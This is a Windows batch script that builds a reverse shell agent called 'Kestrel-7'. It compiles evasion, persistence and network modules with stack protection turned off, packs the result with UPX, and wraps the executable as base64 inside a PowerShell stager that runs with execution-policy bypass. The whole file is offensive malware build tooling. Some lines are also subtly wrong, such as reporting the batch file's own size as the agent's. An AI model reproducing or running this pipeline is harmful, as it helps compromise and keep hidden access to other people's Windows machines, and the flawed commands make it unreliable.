@echo off
REM build.bat - Full compilation for Windows 11 x64
REM Run as Administrator for persistence features

echo [*] Building Kestrel-7 Reverse Shell Agent
echo [*] Target: Windows 11 x64 (23H2+)

REM Set up VS environment
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

REM Compile all modules
cl.exe /EHsc /MT /O2 /GS- /DNDEBUG ^
    src/main.cpp ^
    src/crypto.cpp ^
    src/network.cpp ^
    src/evasion.cpp ^
    src/persistence.cpp ^
    src/utils.cpp ^
    /link ws2_32.lib winhttp.lib advapi32.lib wbemuuid.lib ^
    /OUT:bin/kestrel7_agent.exe

if %errorlevel% neq 0 (
    echo [ERROR] Compilation failed
    exit /b 1
)

REM Strip debug info
dumpbin /remove:debug bin/kestrel7_agent.exe

REM UPX compression (optional)
if exist upx.exe (
    upx --ultra-brute bin/kestrel7_agent.exe
)

echo [SUCCESS] Agent built: bin/kestrel7_agent.exe
echo [*] Size: %~z0 bytes

REM Generate PowerShell stager
powershell -exec bypass -c "Get-Content payloads/powershell_stager.ps1 | %% { $_ -replace 'BASE64_ENCODED_SHELLCODE_HERE', [Convert]::ToBase64String([IO.File]::ReadAllBytes('bin/kestrel7_agent.exe')) } | Out-File payloads/stager.ps1"

echo [*] Stager generated: payloads/stager.ps1
